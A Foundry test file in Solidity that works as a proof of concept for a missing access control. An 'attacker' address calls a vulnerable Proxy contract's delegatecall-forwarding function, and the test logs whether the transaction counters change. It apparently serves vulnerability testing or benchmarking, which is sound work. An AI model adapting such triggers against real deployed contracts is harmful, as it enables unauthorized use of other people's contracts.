// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/proxy.sol";

// Dummy contract to simulate delegatecall target
contract DummyContract {
    function dummyFunction() public pure {}
}

contract ProxyTest is Test {
    // Vulnerable contract
    Proxy proxy;
    
    function setUp() public {
        // Deploy vulnerable contract
        address owner = makeAddr("owner");
        vm.prank(owner);
        proxy = new Proxy();
    }

    function testUnauthorizedAccess() public {
        // Create test accounts
        address attacker = makeAddr("attacker");
        DummyContract dummy = new DummyContract();
        
        // Prepare call data
        bytes memory data = abi.encodeWithSignature("dummyFunction()");
        
        console.log("--- BEFORE-Trigger State ---");
        uint256 totalBefore = proxy.totalTransactions();
        uint256 attackerBefore = proxy.getUserStats(attacker);
        console.log("Total transactions before: %d", totalBefore);
        console.log("Attacker transactions before: %d", attackerBefore);
        console.log("--- END BEFORE-Trigger ---");
        
        console.log("--- Trigger Attack ---");
        // Execute attack
        vm.prank(attacker);
        proxy.forward(address(dummy), data);
        console.log("--- END Trigger ---");
        
        console.log("--- AFTER-Trigger State ---");
        uint256 totalAfter = proxy.totalTransactions();
        uint256 attackerAfter = proxy.getUserStats(attacker);
        console.log("Total transactions after: %d", totalAfter);
        console.log("Attacker transactions after: %d", attackerAfter);
        console.log("--- END AFTER-Trigger ---");

        // Calculate state changes
        bool totalIncreased = (totalAfter == totalBefore + 1);
        bool attackerTxIncreased = (attackerAfter == attackerBefore + 1);
        
        // Differential validation
        if (totalIncreased && attackerTxIncreased) {
            console.log("Vulnerability Exists: Unauthorized access increased transaction counts");
        } else {
            console.log("Vulnerability not Exist: State did not change as expected");
        }

        // Original verification
        assertEq(attackerAfter, 1, "Unauthorized transaction was recorded");
    }
}